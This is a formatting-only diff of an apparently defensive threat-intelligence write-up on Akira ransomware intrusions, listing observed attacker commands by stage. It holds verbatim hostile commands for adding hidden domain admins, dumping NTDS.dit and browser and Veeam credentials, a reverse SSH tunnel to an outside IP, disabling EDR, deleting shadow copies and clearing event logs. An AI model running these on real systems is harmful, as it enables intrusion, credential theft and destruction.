@@ -176,9 +176,9 @@ Impact
 
 **Credential Access**
 - veeam-creds ps1/exe
- - NTDS.dit , system hive extraction
- - Mimikatz
- - DCSync
+- NTDS.dit , system hive extraction
+- Mimikatz
+- DCSync
 <br>
 
 **Impact**
@@ -187,26 +187,26 @@ Impact
 
 # Observations 
 **Initial Access**
- - SSl-VPN exploitation
- - Authentications from VPS (Listed ASNs at the bottome)
+- SSl-VPN exploitation
+- Authentications from VPS (Listed ASNs at the bottome)
 <br>
 
 
 **Discovery**
- - Netscan
- - Advanced_IP-Scanner (downloads or documents)
- - Advanced_Port_Scanner
- - `Nltest /trusted_domains`
- - ping
+- Netscan
+- Advanced_IP-Scanner (downloads or documents)
+- Advanced_Port_Scanner
+- `Nltest /trusted_domains`
+- ping
  ```
 Install-WindowsFeature RSAT-AD-PowerShell
 Get-ADComputer -Filter * -Property * | Select-Object Enabled,
 DNSHostName, IPv4Address, OperatingSystem, Description  >
 C:\programdata\[redacted].txt
 ```
- - `cmd.exe /Q /c nltest /domain_trusts 1> \\Windows\\Temp\\ysKBfL 2>&1`
- - `cmd.exe /Q /c quser 1> \\127.0.0.1\ADMIN$\__1754125023.3698354 2>&1`
- - `net group "Domain admins" /dom`
+ - cmd.exe /Q /c nltest /domain_trusts 1> \\Windows\\Temp\\ysKBfL 2>&1
+ - cmd.exe /Q /c quser 1> \\127.0.0.1\ADMIN$\__1754125023.3698354 2>&1
+ - net group "Domain admins" /dom
  - Adsubnets.csv, adGroups.tx, AdOUs.csv, AdCOmputers.txt, adUsers.txt and AdTrusts.txt (in weird path like C:\ or programdata)
  ```
    Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
@@ -232,8 +232,8 @@ C:\programdata\[redacted].txt
 ```
  - Powerview
  - SharpShares
-   - `C:\programdata\SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$
-/threads:1000 /outfile:C:\programdata\tb.txt`
+   - C:\programdata\SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$
+/threads:1000 /outfile:C:\programdata\tb.txt
  
    -NOTEPAD.EXE C:\ProgramData\tb.txt
  - Grixba (https://fieldeffect.com/blog/grixba-play-ransomware-impersonates-sentinelone, https://www.security.com/threat-intelligence/play-ransomware-volume-shadow-copy)
@@ -250,18 +250,18 @@ C:\programdata\[redacted].txt
  - NetExec
  - PsExec
  - Impacket atexec.py
-   - `C:\Windows\System32\cmd.exe /Q /c quser 1> \Windows\Temp\RANDOMIZED_STRING 2>&1 (Example of impacket)`
+   - C:\Windows\System32\cmd.exe /Q /c quser 1> \Windows\Temp\RANDOMIZED_STRING 2>&1 (Example of impacket)
  - MobaXterm
  - WinRm using Ruby client
 <br>
 
  **Exfil and staging**
- - `"C:\Program Files\WinRAR\WinRAR.exe" a -ep1  -scul -r0 -iext -imon1 -- . X:\[Redacted]`
- - `c:\ProgramData\winrar.exe`
- - `C:\ProgramData\winrar-x64-712.exe`
- - `winrar.exe a -m0 -v3g -tn365d -n*.txt -n*.pdf -n*.xls -n*.doc -n*.xlsx -n*.docx -n*.BAK -n*.MDB  "C:\Data" "\\"<redacted>"`
- - `C:\ProgramData\shares.txt`
- - `"C:\Program Files\FileZilla FTP Client\fzsftp.exe" -v`
+ - "C:\Program Files\WinRAR\WinRAR.exe" a -ep1  -scul -r0 -iext -imon1 -- . X:\[Redacted]
+ - c:\ProgramData\winrar.exe
+ - C:\ProgramData\winrar-x64-712.exe
+ - winrar.exe a -m0 -v3g -tn365d -n*.txt -n*.pdf -n*.xls -n*.doc -n*.xlsx -n*.docx -n*.BAK -n*.MDB  "C:\Data" "\\"<redacted>"
+ - C:\ProgramData\shares.txt
+ - "C:\Program Files\FileZilla FTP Client\fzsftp.exe" -v
  - Rclone
  - 7zip
  - bitwise ssh client
@@ -269,21 +269,20 @@ C:\programdata\[redacted].txt
 <br>
 
 **Persistence**
-- `"C:\Windows\System32\msiexec.exe" /i "C:\ProgramData\OpenSSHa.msi"`
-- `"C:\Windows\system32\net.exe" user lockadmin Msnc?42da /add`
-- `"C:\Windows\system32\reg.exe" add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v commuser /d 0 /f`
-- `net user [REDACTED] VRT83g$%ce /add`
-- `net localgroup Administrators [redacted] /add`
-- `net localgroup "Remote Desktop Users" [redacted] /add`
-- `net  group "Domain Admins" azuresync /add`
-- `cmd.exe /Q /c net user backupSQL Password123$ /add /dom 1> \\Windows\\Temp\\tinhLg 2>&1`
-- `cmd.exe /Q /c net group "Domain Admins" backupSQL  /dom /add 1> \Windows\Temp\NDqyOI 2>&1`
+- "C:\Windows\System32\msiexec.exe" /i "C:\ProgramData\OpenSSHa.msi"
+- "C:\Windows\system32\net.exe" user lockadmin Msnc?42da /add
+- "C:\Windows\system32\reg.exe" add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v commuser /d 0 /f
+- net user [REDACTED] VRT83g$%ce /add
+- net localgroup Administrators [redacted] /add
+- net localgroup "Remote Desktop Users" [redacted] /add
+- net  group "Domain Admins" azuresync /add
+- cmd.exe /Q /c net user backupSQL Password123$ /add /dom 1> \\Windows\\Temp\\tinhLg 2>&1
+- cmd.exe /Q /c net group "Domain Admins" backupSQL  /dom /add 1> \Windows\Temp\NDqyOI 2>&1
 - Cloudflared tunnel  (`C:\programdata\ssh\cloudflared.exe`)
-   - `New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server(sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22`
+   - New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server(sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
  
 cloudflared[.]exe service install REDACTED
-- `C:\ProgramData\cloudflared_msi_install.log.`
-_BASE64_TOKEN
+- C:\ProgramData\cloudflared_msi_install.log._BASE64_TOKEN
 - Chrome remote desktop
 - Anydesk
 
@@ -311,32 +310,31 @@ sc create RustDesk binpath= "\"C:\Program Files\RustDesk\RustDesk.exe\"
 - Ligolo-ng tunnel util
 - Cobalt Strike
 - Payloads pulled from temp.sh
-- ssh
-`ssh -R 5555 root@170.130.165[.]42`
-- `netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow`
-- `New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22`
+- ssh -R 5555 root@170.130.165[.]42
+- netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
+- New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 
 <br>
 
 Credential Access:
- - `cmd.exe /Q /c copy \"C:\Users\[redacted]\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "C:\Windows\Temp\1753954887.8450267"`
- - `"C:\Windows\system32\wbadmin.exe" start backup -backupTarget:\\localhost\c$\ProgramData\ -include:C:\Windows\NTDS\NTDS.dit C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY -quiet`
- - `Veam-get-creds.ps1`
+ - cmd.exe /Q /c copy \"C:\Users\[redacted]\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "C:\Windows\Temp\1753954887.8450267"
+ - "C:\Windows\system32\wbadmin.exe" start backup -backupTarget:\\localhost\c$\ProgramData\ -include:C:\Windows\NTDS\NTDS.dit C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY -quiet
+ - Veam-get-creds.ps1
  - https://github.com/byt3n33dl3/NetExec/blob/8dfd17e4500523a154467ae9c85f0a41c1a16813/nxc/data/veeam_dump_module/veeam_dump_postgresql.ps1
- - `VeeamHax.exe`
+ - VeeamHax.exe
  - NTDS.dit , system hive extraction
  - Mimikatz
  - DCSync
  - DCE-RPC requestt to the ICertPassage Service (UnPAC the Hash)
- - veeam credentials via `sqlcmd -S localhost\REDACTED_USERNAME -E -y500 -s ";" -Q
-"SELECT * FROM [VeeamBackup].[dbo].[Credentials];"`
+ - `veeam credentials via` sqlcmd -S localhost\REDACTED_USERNAME -E -y500 -s ";" -Q
+"SELECT * FROM [VeeamBackup].[dbo].[Credentials];"
 
 <br>
 
 Disabling Security software
-- `Users\REDACTED\AppData\Local\Temp\hlpdrv.sys`
-- `Users\REDACTED\AppData\Local\Temp\rwdrv.sys`
-- `"C:\Windows\system32\SystemSettingsAdminFlows.exe" Defender DisableEnhancedNotifications 1`
+- Users\REDACTED\AppData\Local\Temp\hlpdrv.sys
+- Users\REDACTED\AppData\Local\Temp\rwdrv.sys
+- "C:\Windows\system32\SystemSettingsAdminFlows.exe" Defender DisableEnhancedNotifications 1
 
 - Due to privs can disable securyity via control panel
 - Powershell scripts to set-mppreference options set to disable or $true depending
@@ -349,9 +347,9 @@ reg add
 icies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
 - BYOVD and ran consent.exe from EDR folders which loaded wmsgapi.dll or msimg32.dll which loaded the driver located in temp to disable edr
-- `C:\Users\REDACTED\AppData\Local\Temp\churchill_driver.sys`
-- `C:\Users\REDACTED\AppData\Local\Temp\rwdrv.sys`
-- `C:\Users\REDACTED\AppData\Local\Temp\hlpdrv.sys`
+- C:\Users\REDACTED\AppData\Local\Temp\churchill_driver.sys
+- C:\Users\REDACTED\AppData\Local\Temp\rwdrv.sys
+- C:\Users\REDACTED\AppData\Local\Temp\hlpdrv.sys
 - HyperV check using a bat script
 - reg query
 
@@ -368,41 +366,41 @@ if %ERRORLEVEL% neq 0 (
 
 
 Impact
-- `"C:\WINDOWS\system32\vssadmin.exe" delete shadows /all /quiet`
-- `powershell.exe -Command Get-WmiObject Win32_Shadowcopy | Remove-
-WmiObject`
-- `w.exe  -p=\\[redacted]\C$ -n=1`
-- `w.exe  -n=3 -p=X:\ -dellog`
-- `akira.exe`
-- `lck.exe`
-- `lock.exe`
-- `locker.exe`
-- `pr.exe`
-- `n.exe`
-- `s.exe`
-- `aki.exe`
-- `win.exe`
+- "C:\WINDOWS\system32\vssadmin.exe" delete shadows /all /quiet
+- powershell.exe -Command Get-WmiObject Win32_Shadowcopy | Remove-
+WmiObject
+- w.exe  -p=\\[redacted]\C$ -n=1
+- w.exe  -n=3 -p=X:\ -dellog
+- akira.exe
+- lck.exe
+- lock.exe
+- locker.exe
+- pr.exe
+- n.exe
+- s.exe
+- aki.exe
+- win.exe
 - `chmod +x` befor running esxi encryptor
-- `esx -n -p -fork`
-- `winlocker.exe`
-- `hello.exe`
-- `powershell.exe -ep bypass -Command "Get-WinEvent -ListLog * | where { $_.RecordCount } | ForEach-Object -Process{ [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }"`
+- esx -n -p -fork
+- winlocker.exe
+- hello.exe
+- powershell.exe -ep bypass -Command "Get-WinEvent -ListLog * | where { $_.RecordCount } | ForEach-Object -Process{ [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }"
 - target backups, format/wip disks/ factory reset
 - differy scenarios:
    1: Virtual Disk level - vmdks are encrypted and laptops/desktops left unencypted
    2: Full environment encrypted (OS and vmdks)
    3: In-guest encrypion only - encrypts contents of vms rather than the underlying disk files
 - windows locker writes log files like:
- -  `Log-DD-MM-YYYY-HH-MM-SS.txt`.
-- `.akira` appended to files
-- dumps `akira_readme.txt` within each folder
+ -  Log-DD-MM-YYYY-HH-MM-SS.txt
+- .akira `appended to files`
+- `dumps` akira_readme.txt `within each folder`
 
 <br>
 
 Unsure:
-Elf `vmwaretools` (potential esxi ransomware file observed being pulled by TA from Darktrace)
-`C:\ProgramData\1.bat` (potential defender disabling mentioned in Zensec Blog)
-`C:\ProgramData\2.bat` (Potential AD powershell discovery mentioned in Zensec blog)
+- Elf `vmwaretools` (potential esxi ransomware file observed being pulled by TA from Darktrace)
+- `C:\ProgramData\1.bat` (potential defender disabling mentioned in Zensec Blog)
+- `C:\ProgramData\2.bat` (Potential AD powershell discovery mentioned in Zensec blog)
 
 <br>
 
